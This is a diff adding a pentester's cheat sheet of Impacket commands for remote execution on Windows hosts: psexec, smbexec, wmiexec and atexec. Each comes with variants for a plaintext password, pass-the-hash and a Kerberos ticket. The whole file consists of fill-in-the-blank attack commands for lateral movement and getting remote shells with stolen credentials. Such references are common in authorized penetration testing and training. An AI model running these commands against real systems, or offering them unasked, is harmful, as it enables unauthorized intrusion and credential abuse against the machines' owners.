@@ -1,0 +1,42 @@
+ % impacket, windows, exec
+
+# PSEXEC with username
+create a new service (using \pipe\svcctl via SMB) 
+psexec.py <domain>/<user>:<password>@<ip> 
+
+# PSEXEC with pass the Hash (pth)
+create a new service (using \pipe\svcctl via SMB) 
+psexec.py -hashes <hash> <user>@<ip> 
+
+# PSEXEC with kerberos
+create a new service (using \pipe\svcctl via SMB) 
+export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name> 
+
+# SMBEXEC with username
+create a new service 'BTOBTO' (using temp bat files via SMB) 
+smbexec.py <domain>/<user>:<password>@<ip> 
+
+# SMBEXEC with pass the Hash (pth)
+create a new service 'BTOBTO' (using temp bat files via SMB) 
+smbexec.py -hashes <hash> <user>@<ip> 
+
+# SMBEXEC with kerberos
+create a new service 'BTOBTO' (using temp bat files via SMB) 
+export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name> 
+
+# wmiexec
+Execute a command shell without touching the disk or running a new service using DCOM 
+wmiexec.py <domain>/<user>:<password>@<ip> 
+
+# wmiexec  with pass the hash (pth) 
+
+Execute a command shell without touching the disk or running a new service using DCOM 
+wmiexec.py -hashes <hash> <user>@<ip> 
+
+# atexec - execute command view the task scheduler 
+Using \pipe\atsvc via SMB 
+atexec.py <domain>/<user>:<password>@<ip> "command" 
+
+# atexec pass the hash (pth)
+Execute command view the task scheduler (using \pipe\atsvc via SMB) 
+atexec.py -hashes <hash> <user>@<ip> "command" 
